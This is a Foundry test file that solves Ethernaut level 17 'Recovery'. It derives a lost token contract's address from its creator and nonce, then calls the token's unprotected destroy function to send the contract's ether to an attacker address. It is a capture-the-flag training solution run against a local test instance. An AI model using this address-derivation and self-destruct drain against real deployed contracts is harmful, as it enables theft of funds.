// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/17-Recovery/RecoveryFactory.sol";
import "../core/Ethernaut.sol";

contract RecoveryTest is Test {
    Ethernaut ethernaut;
    address payable attacker = payable(makeAddr("attacker"));

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testRecoveryHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        RecoveryFactory recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);
        vm.startPrank(attacker, attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
        Recovery ethernautRecovery = Recovery(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Several ways to find the lost address:
        // 1. Look at Recovery contract on etherscan and find the contract cereation transcation
        // 2. Calculate the lostaddress according to EVM
        // Here, the solution 2 is used. The solution is in the RecoveryFactory contract
        // but several stackoverflow threads answer the question:
        // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
        // https://ethereum.stackexchange.com/questions/24248/how-to-calculate-an-ethereum-contracts-address-during-its-creation-using-the-so
        // To further understand the solution:
        // https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/

        address payable lostAddress = payable(
            address(
                uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), ethernautRecovery, uint8(0x01)))))
            )
        );
        SimpleToken(lostAddress).destroy(attacker);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
